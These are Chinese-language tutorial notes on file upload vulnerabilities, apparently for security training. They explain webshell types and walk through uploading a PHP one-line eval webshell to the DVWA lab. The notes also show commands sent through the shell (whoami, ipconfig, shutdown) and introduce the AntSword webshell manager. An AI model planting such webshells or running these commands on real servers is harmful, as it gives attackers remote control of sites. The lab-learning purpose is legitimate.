**什么是文件上传漏洞
##文件上传漏洞简介
----顾名思义，文件上传就是将客户端的文件上传到服务器的过程称为文件上传。比如QQ空间发表说说上传的图片、招聘网上传简历、合天网安实验
室修改头像、将文件上传到网盘等，这些都是文件上传。
----上传文件是很多网站都具有的功能，如果开发者没有对文件做严格的限制，就会导致安全隐患

**黑客会上传什么
##后门文件简历
----WebShell:网站后门
---WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以称其为一种网页后门。黑客在入侵一个网站后，通
常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，以达到控制网站服务器的目的。

##了解后门文件——Webshell
----webshell的分类
--大马
-1.体积大，功能全
-2.会调用系统的关键函数
-3.以代码加密进行隐藏
--小马
-1.体积小，功能少
-2.只有一个上传功能
--一句话木马
-1.代码短，只有一行代码
-2.使用场景大，可单独生成文件可插入文件
-3.安全性高，隐匿性强，可变性免杀
-4.框架不便，数据执行(数据传递)

##了解后门文件——PHP一句话木马
----<?php eval($_GET[ 'pass' ]);?>
----首先我们先看到一个原始而又简单的php一句话木马
---1.php的代码要写在里面，服务器才能认出来这是php代码，然后才去解析
---2.@符号的意思是不报错，即使执行错误，也不报错
---3.eval 将字符串当作PHP代码执行

**怎样上传网站后门
##隐患严重的漏洞——File Upload
----用户上传png图片当作头像，服务器将png文件保存在服务器磁盘上
----怎样利用才能攻击这个网站呢？
---用户上传PHP木马当作头像，服务器将PHP木马保存在服务器磁盘上
----可以简单理解：能随意上传任何文件的网站就存在漏洞

**DVWA之文件上传漏洞
##File Upload low ——上传后门文件
----在本地创建后门文件（webshell.php）并输入<?php eval($_POST[ 'pass' ]);?>，并上传至服务器，得到提示
----../../hackable/uploads/webshell.php succesfully uploaded!
----其中，../../hackable/uploads/webshell.php代表上传的地址，../代表当前目录的上一级目录，所以上传的后门文件地址是
http://127.0.0.1/DVWA/hackable/uploads/webshell.php
##File Upload low——上传之后怎么使用木马
----方法一：在浏览器安装hackbar插件post数据 pass=[php代码]
---例如：
--pass=phpinfo(); 得到php的版本信息及配置变量等
--pass=system('whoami'); desktop-ticgpdu\86177 
--pass=system('ipconfig'); IP网址
--pass=system('shutdown'); 关闭
----方法二：使用Webshell管理工具
---Webshell管理工具介绍——中国蚁剑
--中国蚁剑是一款开源的跨平台网站管理工具，它主要面向于合法授权的渗透测试安全人员以及进行常规操作的网站管理员。
--https://github.com/AntSwordProject/AntSword-Loader
----蚁剑自动管理webshell
---步骤一：右键添加数据
---步骤二：添加数据
--url地址既上传的后门地址
--连接密码既webshell[]包裹的字符串


